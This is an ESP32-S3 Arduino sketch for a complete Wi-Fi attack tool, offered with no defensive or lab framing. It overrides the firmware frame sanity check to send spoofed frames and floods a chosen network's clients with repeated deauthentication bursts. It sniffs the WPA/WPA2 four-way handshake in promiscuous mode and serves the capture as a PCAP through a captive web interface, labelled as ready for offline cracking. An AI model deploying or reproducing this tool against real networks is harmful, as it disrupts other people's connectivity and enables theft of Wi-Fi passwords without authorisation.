/*
 ==============================================================
  handshake.ino — ESP32-S3 N16R8 / N16R8U
  WPA/WPA2 Handshake Capture (hardened)

  SoftAP + captive DNS + deauth + promiscuous EAPOL + PCAP
  Board: ESP32S3 Dev Module, 16MB, Huge APP, OPI PSRAM,
         USB CDC Off, 240 MHz
 ==============================================================
*/

#include <Arduino.h>
#include <WiFi.h>
#include <AsyncTCP.h>
#include <ESPAsyncWebServer.h>
#include <DNSServer.h>
#include <esp_wifi.h>
#include <esp_wifi_types.h>
#include <esp_timer.h>
#include <esp_heap_caps.h>
#include <nvs_flash.h>
#include <freertos/FreeRTOS.h>
#include <freertos/semphr.h>
#include <atomic>
#include <string.h>

// Strong override. build.yml weakens the library definition so this
// wins at link time. Return 0 = accept every frame.
extern "C" int ieee80211_raw_frame_sanity_check(int32_t a, int32_t b, int32_t c) {
  (void)a; (void)b; (void)c;
  return 0;
}

// ── Config ──────────────────────────────────────────────────────────────────
static const char* AP_SSID      = "HandshakeCapture";
static const char* AP_PASS      = "handshake1";
static const int   AP_CHANNEL   = 6;
static const int   WEB_PORT     = 80;
static const int   DNS_PORT     = 53;
static const int   MAX_TX_POWER = 78;          // 0.25 dBm units → ~19.5 dBm
static const size_t CAP_BUF_SIZE = 512 * 1024; // 512 KB PSRAM preferred
static const int   DEAUTH_BURST  = 24;         // denser burst
static const uint32_t CAPTURE_MS = 15000;
static const uint16_t MAX_FRAME  = 512;        // ISR hard bound

// ── PCAP (raw 802.11, DLT 105) ──────────────────────────────────────────────
struct __attribute__((packed)) PcapGlobalHdr {
  uint32_t magic;
  uint16_t vmaj, vmin;
  int32_t  zone;
  uint32_t sigs, snap, net;
};
struct __attribute__((packed)) PcapRecHdr {
  uint32_t ts_sec, ts_usec, incl_len, orig_len;
};

// ── Shared state ────────────────────────────────────────────────────────────
struct HandshakeState {
  bool m1, m2, m3, m4;
  uint8_t ap_mac[6];
  uint8_t cli_mac[6];
  uint32_t frame_count;
};

static uint8_t*          g_capBuf      = nullptr;
static size_t            g_capLen      = 0;
static size_t            g_capCapacity = 0;
static bool              g_capOverflow = false;
static SemaphoreHandle_t g_capMutex    = nullptr;

static HandshakeState    g_hs       = {};
static SemaphoreHandle_t g_hsMutex  = nullptr;

static uint8_t           g_targetBSSID[6] = {};
static std::atomic<int>  g_targetCh{0};
static std::atomic<bool> g_capturing{false};
static std::atomic<bool> g_filterTarget{false};
static std::atomic<uint32_t> g_captureStart{0};
static std::atomic<uint32_t> g_eapolSeen{0};

AsyncWebServer server(WEB_PORT);
DNSServer      dns;

// ── Helpers ─────────────────────────────────────────────────────────────────
static inline bool macEq(const uint8_t* a, const uint8_t* b) {
  return memcmp(a, b, 6) == 0;
}
static inline bool macZero(const uint8_t* m) {
  return !(m[0] | m[1] | m[2] | m[3] | m[4] | m[5]);
}
static inline void macCopy(uint8_t* d, const uint8_t* s) {
  memcpy(d, s, 6);
}

// ── ISR-safe frame append ───────────────────────────────────────────────────
static void IRAM_ATTR appendFrame(const uint8_t* payload, uint16_t plen) {
  if (!g_capBuf || !g_capMutex) return;
  if (plen > MAX_FRAME) plen = MAX_FRAME;

  BaseType_t woken = pdFALSE;
  if (xSemaphoreTakeFromISR(g_capMutex, &woken) != pdTRUE) return;

  const uint32_t need = sizeof(PcapRecHdr) + plen;
  if (g_capLen + need <= g_capCapacity) {
    int64_t us = esp_timer_get_time();
    PcapRecHdr rh = {
      (uint32_t)(us / 1000000LL),
      (uint32_t)(us % 1000000LL),
      plen, plen
    };
    memcpy(g_capBuf + g_capLen, &rh, sizeof(rh));
    g_capLen += sizeof(rh);
    memcpy(g_capBuf + g_capLen, payload, plen);
    g_capLen += plen;
  } else {
    g_capOverflow = true;
  }
  xSemaphoreGiveFromISR(g_capMutex, &woken);
  if (woken) portYIELD_FROM_ISR();
}

// ── EAPOL M1–M4 classifier (pairwise only) ──────────────────────────────────
// Returns 1..4 or 0. Extracts BSSID + client MAC for filtering / state.
static int parseEAPOL(const uint8_t* f, uint16_t len,
                      uint8_t* out_bssid, uint8_t* out_client) {
  if (len < 36) return 0;
  if (((f[0] >> 2) & 0x03) != 0x02) return 0; // not data

  const bool toDS   = f[1] & 0x01;
  const bool fromDS = (f[1] >> 1) & 0x01;
  const uint8_t subtype = (f[0] >> 4) & 0x0F;
  // QoS data has 26-byte header; non-QoS 24
  const uint16_t hdrLen = (subtype >= 8) ? 26u : 24u;

  if (toDS && !fromDS) {          // STA → AP
    macCopy(out_bssid,  f + 16);
    macCopy(out_client, f + 10);
  } else if (!toDS && fromDS) {   // AP → STA
    macCopy(out_bssid,  f + 10);
    macCopy(out_client, f + 4);
  } else {                        // WDS / other — best effort
    macCopy(out_bssid,  f + 16);
    macCopy(out_client, f + 10);
  }

  if (len < hdrLen + 10) return 0;
  const uint8_t* llc = f + hdrLen;
  // SNAP + EtherType 0x888E
  if (llc[0] != 0xAA || llc[1] != 0xAA || llc[2] != 0x03) return 0;
  if (llc[6] != 0x88 || llc[7] != 0x8E) return 0;

  const uint8_t* eapol = llc + 8;
  if ((len - hdrLen - 8) < 99) return 0;
  if (eapol[1] != 0x03) return 0; // Key

  const uint16_t ki = ((uint16_t)eapol[5] << 8) | eapol[6];
  if (!(ki & 0x0008)) return 0; // not pairwise

  const bool ack     = (ki & 0x0080) != 0;
  const bool mic     = (ki & 0x0100) != 0;
  const bool install = (ki & 0x0040) != 0;
  const bool secure  = (ki & 0x0200) != 0;

  // Classic 4-way mapping
  if ( ack && !mic)                        return 1; // M1
  if (!ack &&  mic && !secure)             return 2; // M2
  if ( ack &&  mic &&  secure && install)  return 3; // M3
  if (!ack &&  mic &&  secure && !install) return 4; // M4
  return 0;
}

// ── Promiscuous RX ──────────────────────────────────────────────────────────
void IRAM_ATTR promisc_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_DATA || !g_capturing.load(std::memory_order_relaxed)) return;

  const wifi_promiscuous_pkt_t* pkt = (const wifi_promiscuous_pkt_t*)buf;
  const uint16_t len = pkt->rx_ctrl.sig_len;
  if (len < 36 || len > 2300) return;

  uint8_t bssid[6], client[6];
  int msg = parseEAPOL(pkt->payload, len, bssid, client);
  if (!msg) return;

  if (g_filterTarget.load(std::memory_order_relaxed) &&
      !macZero(g_targetBSSID) && !macEq(bssid, g_targetBSSID))
    return;

  appendFrame(pkt->payload, len);
  g_eapolSeen.fetch_add(1, std::memory_order_relaxed);

  if (xSemaphoreTake(g_hsMutex, 0) == pdTRUE) {
    if (macZero(g_hs.ap_mac)) {
      macCopy(g_hs.ap_mac, bssid);
      macCopy(g_hs.cli_mac, client);
    }
    if (msg == 1) g_hs.m1 = true;
    if (msg == 2) g_hs.m2 = true;
    if (msg == 3) g_hs.m3 = true;
    if (msg == 4) g_hs.m4 = true;
    g_hs.frame_count++;
    xSemaphoreGive(g_hsMutex);
  }
}

// ── Deauth (broadcast + directed, both directions) ──────────────────────────
static void sendDeauth(const uint8_t* bssid, const uint8_t* client, int ch) {
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);

  // Management deauth frame skeleton
  uint8_t frame[26] = {
    0xC0, 0x00,             // type/subtype: deauth
    0x00, 0x00,             // duration
    0,0,0,0,0,0,            // addr1 (DA)
    0,0,0,0,0,0,            // addr2 (SA)
    0,0,0,0,0,0,            // addr3 (BSSID)
    0x00, 0x00,             // seq
    0x07, 0x00              // reason: Class 3 frame from nonassociated STA
  };

  for (int i = 0; i < DEAUTH_BURST; i++) {
    // Directed: AP → client
    macCopy(frame + 4,  client);
    macCopy(frame + 10, bssid);
    macCopy(frame + 16, bssid);
    esp_wifi_80211_tx(WIFI_IF_STA, frame, 26, false);
    delayMicroseconds(150);

    // Directed: client → AP (spoofed)
    macCopy(frame + 4,  bssid);
    macCopy(frame + 10, client);
    macCopy(frame + 16, bssid);
    esp_wifi_80211_tx(WIFI_IF_STA, frame, 26, false);
    delayMicroseconds(150);

    // Broadcast every 4th iteration for clients we have not seen yet
    if ((i & 3) == 0) {
      memset(frame + 4, 0xFF, 6);
      macCopy(frame + 10, bssid);
      macCopy(frame + 16, bssid);
      esp_wifi_80211_tx(WIFI_IF_STA, frame, 26, false);
      delayMicroseconds(150);
    }
  }
}

// ── Capture control ─────────────────────────────────────────────────────────
static void startCapture(int ch, const uint8_t* bssid) {
  if (g_capturing.load()) return;

  if (xSemaphoreTake(g_hsMutex, pdMS_TO_TICKS(100)) == pdTRUE) {
    memset(&g_hs, 0, sizeof(g_hs));
    xSemaphoreGive(g_hsMutex);
  }
  if (xSemaphoreTake(g_capMutex, pdMS_TO_TICKS(100)) == pdTRUE) {
    g_capLen = sizeof(PcapGlobalHdr);
    g_capOverflow = false;
    PcapGlobalHdr gh = {0xa1b2c3d4u, 2, 4, 0, 0, 65535, 105};
    memcpy(g_capBuf, &gh, sizeof(gh));
    xSemaphoreGive(g_capMutex);
  }

  macCopy(g_targetBSSID, bssid);
  g_filterTarget.store(true);
  g_targetCh.store(ch);
  g_captureStart.store(millis());
  g_eapolSeen.store(0);
  g_capturing.store(true);

  // Bring up STA interface so we can TX deauth while AP stays up
  wifi_mode_t mode;
  esp_wifi_get_mode(&mode);
  if (mode != WIFI_MODE_APSTA) {
    esp_wifi_set_mode(WIFI_MODE_APSTA);
    delay(30);
  }

  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);

  wifi_promiscuous_filter_t filt = {};
  filt.filter_mask = WIFI_PROMIS_FILTER_MASK_DATA;
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_promiscuous_rx_cb(&promisc_cb);
  esp_wifi_set_promiscuous(true);

  // Initial deauth burst (broadcast + empty client)
  uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
  uint8_t zero[6]  = {0};
  sendDeauth(bssid, bcast, ch);
  sendDeauth(bssid, zero,  ch);
}

static void stopCapture() {
  g_capturing.store(false);
  esp_wifi_set_promiscuous(false);
  // Return to pure AP if desired; leave APSTA for simplicity
}

static bool isCrackable() {
  HandshakeState hs;
  if (xSemaphoreTake(g_hsMutex, pdMS_TO_TICKS(20)) != pdTRUE) return false;
  hs = g_hs;
  xSemaphoreGive(g_hsMutex);
  // M1+M2 is the minimum usable pair for offline cracking
  return hs.m1 && hs.m2;
}

// ── UI ──────────────────────────────────────────────────────────────────────
static const char INDEX_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head>
<meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1">
<title>Handshake</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#0b0e14;color:#e2e8f0;font-family:system-ui;padding:16px}
.card{background:#12161f;border:1px solid #1c2333;border-radius:12px;padding:20px;max-width:440px;margin:0 auto}
h1{font-size:20px;color:#00d4aa;margin-bottom:4px}
.sub{font-size:11px;color:#64748b;margin-bottom:16px}
label{display:block;font-size:11px;color:#94a3b8;margin-bottom:4px;text-transform:uppercase}
input,select{width:100%;padding:10px;background:#07090e;border:1px solid #1c2333;border-radius:8px;color:#e2e8f0;font-size:14px;margin-bottom:12px}
.btn{width:100%;padding:12px;border:none;border-radius:8px;font-size:14px;font-weight:700;cursor:pointer;margin-bottom:8px}
.btn-go{background:#00d4aa;color:#0b0e14}.btn-stop{background:#be123c;color:#fff}
.btn-dl{background:#0369a1;color:#fff}.btn-scan{background:#7c3aed;color:#fff}
.st{font-family:monospace;font-size:12px;background:#07090e;border-radius:8px;padding:12px;margin-top:10px;line-height:1.6;color:#94a3b8}
.st b{color:#00d4aa}.ok{color:#4ade80}.warn{color:#f87171}
#list{max-height:220px;overflow-y:auto;margin-bottom:12px}
.ap{display:flex;justify-content:space-between;align-items:center;padding:8px 10px;border:1px solid #1c2333;border-radius:8px;margin-bottom:6px;cursor:pointer;background:#07090e}
.ap:hover{border-color:#00d4aa}
.ap .n{font-size:13px;color:#e2e8f0}.ap .m{font-size:10px;color:#64748b;font-family:monospace}
.ap .r{font-size:11px;color:#94a3b8;text-align:right}
</style></head><body>
<div class=card>
<h1>Handshake Capture</h1>
<div class=sub>ESP32-S3 · scan · deauth · EAPOL · PCAP</div>
<button class="btn btn-scan" onclick=scan()>SCAN NETWORKS</button>
<div id=list></div>
<label>Target BSSID</label>
<input id=bssid placeholder=AA:BB:CC:DD:EE:FF maxlength=17 style=text-transform:uppercase;font-family:monospace>
<label>Channel</label>
<select id=ch>
<option>1</option><option>2</option><option>3</option><option>4</option><option>5</option>
<option selected>6</option><option>7</option><option>8</option><option>9</option>
<option>10</option><option>11</option><option>12</option><option>13</option>
</select>
<button class="btn btn-go" onclick=go()>CAPTURE</button>
<button class="btn btn-stop" onclick=stop()>STOP</button>
<button class="btn btn-dl" onclick="location='/pcap'">DOWNLOAD PCAP</button>
<div class=st id=st>Ready</div>
</div>
<script>
function scan(){
  document.getElementById('st').textContent='Scanning…';
  document.getElementById('list').innerHTML='';
  fetch('/scan').then(r=>r.json()).then(arr=>{
    const list=document.getElementById('list');
    if(!arr.length){list.innerHTML='<div class=st>No APs found</div>';return}
    arr.sort((a,b)=>b.rssi-a.rssi);
    arr.forEach(ap=>{
      const d=document.createElement('div');
      d.className='ap';
      d.innerHTML='<div><div class=n>'+esc(ap.ssid||'(hidden)')+'</div><div class=m>'+ap.bssid+'</div></div>'+
                  '<div class=r>CH '+ap.ch+'<br>'+ap.rssi+' dBm</div>';
      d.onclick=()=>{
        document.getElementById('bssid').value=ap.bssid;
        document.getElementById('ch').value=String(ap.ch);
        document.getElementById('st').textContent='Selected '+ap.ssid+' / '+ap.bssid+' CH'+ap.ch;
      };
      list.appendChild(d);
    });
    document.getElementById('st').textContent='Found '+arr.length+' AP(s) — tap to select';
  }).catch(e=>{document.getElementById('st').textContent='Scan failed';});
}
function esc(s){return s.replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]))}
function go(){
  const b=document.getElementById('bssid').value.trim().toUpperCase();
  const c=document.getElementById('ch').value;
  if(b.length!==17){alert('Bad BSSID');return}
  fetch('/capture?bssid='+encodeURIComponent(b)+'&ch='+c)
    .then(r=>r.text()).then(t=>{document.getElementById('st').textContent=t;poll()})
}
function stop(){fetch('/stop').then(r=>r.text()).then(t=>{document.getElementById('st').textContent=t})}
function poll(){
  fetch('/status').then(r=>r.json()).then(d=>{
    let s='Capturing: <b>'+(d.on?'YES':'NO')+'</b><br>'
    s+='M1:'+(d.m1?'✓':'·')+' M2:'+(d.m2?'✓':'·')+' M3:'+(d.m3?'✓':'·')+' M4:'+(d.m4?'✓':'·')+'<br>'
    s+='EAPOL frames: '+d.eapol+' · stored: '+d.frames+'<br>'
    s+='Bytes: '+d.bytes+(d.overflow?' <span class=warn>OVERFLOW</span>':'')+' / '+d.cap+'<br>'
    if(d.ok)s+='<span class=ok><b>HANDSHAKE READY</b></span>'
    document.getElementById('st').innerHTML=s
    if(d.on)setTimeout(poll,800)
  }).catch(()=>{})
}
</script></body></html>
)rawliteral";

// ── HTTP handlers ───────────────────────────────────────────────────────────
void setupServer() {
  server.on("/", HTTP_GET, [](AsyncWebServerRequest* r){
    r->send_P(200, "text/html", INDEX_HTML);
  });

  // Blocking scan on STA interface (AP stays up under AP+STA)
  server.on("/scan", HTTP_GET, [](AsyncWebServerRequest* r){
    if (g_capturing.load()) {
      r->send(409, "text/plain", "busy capturing"); return;
    }
    // Ensure STA is up for scan
    wifi_mode_t mode;
    esp_wifi_get_mode(&mode);
    if (mode != WIFI_MODE_APSTA) {
      esp_wifi_set_mode(WIFI_MODE_APSTA);
      delay(50);
    }
    int n = WiFi.scanNetworks(/*async=*/false, /*hidden=*/true);
    String json = "[";
    for (int i = 0; i < n; i++) {
      if (i) json += ',';
      String ssid = WiFi.SSID(i);
      ssid.replace("\\", "\\\\");
      ssid.replace("\"", "\\\"");
      char bssid[18];
      uint8_t* b = WiFi.BSSID(i);
      snprintf(bssid, sizeof(bssid), "%02X:%02X:%02X:%02X:%02X:%02X",
               b[0], b[1], b[2], b[3], b[4], b[5]);
      json += "{\"ssid\":\"" + ssid + "\",\"bssid\":\"" + String(bssid) +
              "\",\"ch\":" + String(WiFi.channel(i)) +
              ",\"rssi\":" + String(WiFi.RSSI(i)) +
              ",\"enc\":" + String((int)WiFi.encryptionType(i)) + "}";
    }
    json += "]";
    WiFi.scanDelete();
    r->send(200, "application/json", json);
  });

  server.on("/capture", HTTP_GET, [](AsyncWebServerRequest* r){
    if (!r->hasParam("bssid") || !r->hasParam("ch")) {
      r->send(400, "text/plain", "bssid+ch required"); return;
    }
    String bs = r->getParam("bssid")->value();
    int ch = r->getParam("ch")->value().toInt();
    if (bs.length() != 17 || ch < 1 || ch > 13) {
      r->send(400, "text/plain", "bad params"); return;
    }
    uint8_t bssid[6];
    if (sscanf(bs.c_str(), "%02hhx:%02hhx:%02hhx:%02hhx:%02hhx:%02hhx",
               &bssid[0], &bssid[1], &bssid[2],
               &bssid[3], &bssid[4], &bssid[5]) != 6) {
      r->send(400, "text/plain", "bad BSSID"); return;
    }
    startCapture(ch, bssid);
    char buf[96];
    snprintf(buf, sizeof(buf), "Capturing %s CH%d", bs.c_str(), ch);
    r->send(200, "text/plain", buf);
  });

  server.on("/stop", HTTP_GET, [](AsyncWebServerRequest* r){
    stopCapture();
    r->send(200, "text/plain", "Stopped");
  });

  server.on("/status", HTTP_GET, [](AsyncWebServerRequest* r){
    HandshakeState hs = {};
    if (xSemaphoreTake(g_hsMutex, pdMS_TO_TICKS(20)) == pdTRUE) {
      hs = g_hs; xSemaphoreGive(g_hsMutex);
    }
    size_t bytes = 0, cap = 0; bool ov = false;
    if (xSemaphoreTake(g_capMutex, pdMS_TO_TICKS(20)) == pdTRUE) {
      bytes = g_capLen; cap = g_capCapacity; ov = g_capOverflow;
      xSemaphoreGive(g_capMutex);
    }
    char buf[240];
    snprintf(buf, sizeof(buf),
      "{\"on\":%s,\"m1\":%s,\"m2\":%s,\"m3\":%s,\"m4\":%s,"
      "\"ok\":%s,\"bytes\":%u,\"cap\":%u,\"overflow\":%s,"
      "\"eapol\":%u,\"frames\":%u}",
      g_capturing.load() ? "true" : "false",
      hs.m1 ? "true" : "false", hs.m2 ? "true" : "false",
      hs.m3 ? "true" : "false", hs.m4 ? "true" : "false",
      (hs.m1 && hs.m2) ? "true" : "false",
      (unsigned)bytes, (unsigned)cap, ov ? "true" : "false",
      (unsigned)g_eapolSeen.load(), (unsigned)hs.frame_count);
    r->send(200, "application/json", buf);
  });

  server.on("/pcap", HTTP_GET, [](AsyncWebServerRequest* r){
    if (!g_capBuf) { r->send(404, "text/plain", "no buffer"); return; }
    size_t len = 0;
    if (xSemaphoreTake(g_capMutex, pdMS_TO_TICKS(200)) == pdTRUE) {
      len = g_capLen; xSemaphoreGive(g_capMutex);
    }
    if (len <= sizeof(PcapGlobalHdr)) {
      r->send(404, "text/plain", "no data"); return;
    }
    uint8_t* snap = (uint8_t*)heap_caps_malloc(len, MALLOC_CAP_SPIRAM);
    if (!snap) snap = (uint8_t*)malloc(len);
    if (!snap) { r->send(500, "text/plain", "OOM"); return; }

    if (xSemaphoreTake(g_capMutex, pdMS_TO_TICKS(200)) == pdTRUE) {
      memcpy(snap, g_capBuf, len);
      xSemaphoreGive(g_capMutex);
    } else {
      free(snap); r->send(503, "text/plain", "busy"); return;
    }

    // ESPAsyncWebServer 3.x: beginResponse(contentType, len, filler)
    auto* resp = r->beginResponse("application/octet-stream", len,
      [snap, len](uint8_t* buf, size_t maxLen, size_t idx) -> size_t {
        size_t rem = len - idx;
        size_t n = rem < maxLen ? rem : maxLen;
        if (n == 0) { free(snap); return 0; }
        memcpy(buf, snap + idx, n);
        return n;
      });
    resp->addHeader("Content-Disposition", "attachment; filename=\"handshake.pcap\"");
    r->send(resp);
  });

  // Captive portal probes
  server.on("/generate_204", HTTP_GET, [](AsyncWebServerRequest* r){ r->send(204); });
  server.on("/gen_204", HTTP_GET, [](AsyncWebServerRequest* r){ r->send(204); });
  server.on("/hotspot-detect.html", HTTP_GET, [](AsyncWebServerRequest* r){
    r->send(200, "text/html", "<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>");
  });
  server.on("/library/test/success.html", HTTP_GET, [](AsyncWebServerRequest* r){
    r->send(200, "text/html", "<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>");
  });
  server.on("/ncsi.txt", HTTP_GET, [](AsyncWebServerRequest* r){
    r->send(200, "text/plain", "Microsoft NCSI");
  });
  server.on("/connecttest.txt", HTTP_GET, [](AsyncWebServerRequest* r){
    r->send(200, "text/plain", "Microsoft Connect Test");
  });
  server.on("/success.txt", HTTP_GET, [](AsyncWebServerRequest* r){
    r->send(200, "text/plain", "success");
  });
  server.onNotFound([](AsyncWebServerRequest* r){
    r->redirect("http://192.168.4.1/");
  });
}

// ── Setup ───────────────────────────────────────────────────────────────────
void setup() {
  Serial.begin(115200);
  delay(150);
  Serial.println("\n=== Handshake Capture (hardened) ===");

  g_capMutex = xSemaphoreCreateMutex();
  g_hsMutex  = xSemaphoreCreateMutex();
  if (!g_capMutex || !g_hsMutex) {
    Serial.println("FATAL mutex");
    while (1) delay(1000);
  }

  // Prefer PSRAM for capture buffer
  if (psramFound()) {
    g_capBuf = (uint8_t*)heap_caps_malloc(CAP_BUF_SIZE, MALLOC_CAP_SPIRAM);
    if (g_capBuf) {
      g_capCapacity = CAP_BUF_SIZE;
      Serial.printf("PSRAM buffer %u KB\n", (unsigned)(CAP_BUF_SIZE / 1024));
    }
  }
  if (!g_capBuf) {
    g_capCapacity = CAP_BUF_SIZE / 4;
    g_capBuf = (uint8_t*)malloc(g_capCapacity);
    Serial.printf("Heap buffer %u KB\n", (unsigned)(g_capCapacity / 1024));
  }
  if (!g_capBuf) {
    Serial.println("FATAL no buffer");
    while (1) delay(1000);
  }
  PcapGlobalHdr gh = {0xa1b2c3d4u, 2, 4, 0, 0, 65535, 105};
  memcpy(g_capBuf, &gh, sizeof(gh));
  g_capLen = sizeof(gh);

  esp_err_t nvs = nvs_flash_init();
  if (nvs == ESP_ERR_NVS_NO_FREE_PAGES || nvs == ESP_ERR_NVS_NEW_VERSION_FOUND) {
    nvs_flash_erase();
    nvs_flash_init();
  }

  // Start in AP+STA so deauth TX works while SoftAP stays up
  WiFi.mode(WIFI_AP_STA);
  delay(50);

  IPAddress apIP(192, 168, 4, 1), gw(192, 168, 4, 1), sn(255, 255, 255, 0);
  WiFi.softAPConfig(apIP, gw, sn);

  wifi_country_t cc = {};
  cc.cc[0] = 'P'; cc.cc[1] = 'H';
  cc.schan = 1; cc.nchan = 13; cc.max_tx_power = 20;
  cc.policy = WIFI_COUNTRY_POLICY_MANUAL;
  esp_wifi_set_country(&cc);

  if (!WiFi.softAP(AP_SSID, AP_PASS, AP_CHANNEL, 0, 4)) {
    Serial.println("FATAL softAP failed");
    while (1) delay(1000);
  }
  delay(200);
  esp_wifi_set_max_tx_power(MAX_TX_POWER);
  esp_wifi_set_ps(WIFI_PS_NONE);

  dns.start(DNS_PORT, "*", apIP);
  setupServer();
  server.begin();

  Serial.printf("AP: %s\nIP: %s\nUI: http://192.168.4.1/\n",
                AP_SSID, WiFi.softAPIP().toString().c_str());
  Serial.printf("Override: ieee80211_raw_frame_sanity_check → accept-all\n");
}

void loop() {
  dns.processNextRequest();

  if (g_capturing.load()) {
    // Mid-capture deauth refresh every ~2 s to force more reassociations
    static uint32_t lastDeauth = 0;
    uint32_t now = millis();
    if (now - lastDeauth > 2000) {
      lastDeauth = now;
      int ch = g_targetCh.load();
      uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
      sendDeauth(g_targetBSSID, bcast, ch);
    }

    if (isCrackable() || (now - g_captureStart.load() > CAPTURE_MS)) {
      bool ok = isCrackable();
      stopCapture();
      Serial.println(ok ? "[HS] Ready (M1+M2)" : "[HS] Timeout");
    }
  }
  delay(5);
}
